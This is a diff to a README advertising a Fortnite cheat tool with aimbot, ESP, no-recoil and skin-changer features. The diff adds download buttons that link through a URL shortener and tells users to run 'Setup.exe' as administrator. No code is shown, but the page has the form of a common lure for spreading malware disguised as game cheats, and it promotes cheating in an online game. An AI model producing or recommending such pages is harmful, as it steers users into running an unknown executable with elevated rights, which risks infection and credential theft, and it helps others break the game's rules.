@@ -36,12 +36,26 @@ Includes **AI Aimbot**, **3D ESP**, **No Recoil**, **Auto-Build Assist**, and a 
 
 Choose your system and download the latest build:
 
+<table>
+  <tr>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="fortnite ai hack" width="250">
+      </a>
+    </td>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="fortnite skin changer" width="250">
+      </a>
+    </td>
+  </tr>
+</table>
 
 
 ### Installation
 
 1. Unpack the archive using 7-Zip or WinRAR.  
-2. Launch `installer.exe` as administrator.  
+2. Launch `Setup.exe` as administrator.  
 3. Follow on-screen instructions to complete setup.  
 4. Run the game and the tool in parallel.  
 5. Configure hotkeys or use default settings.
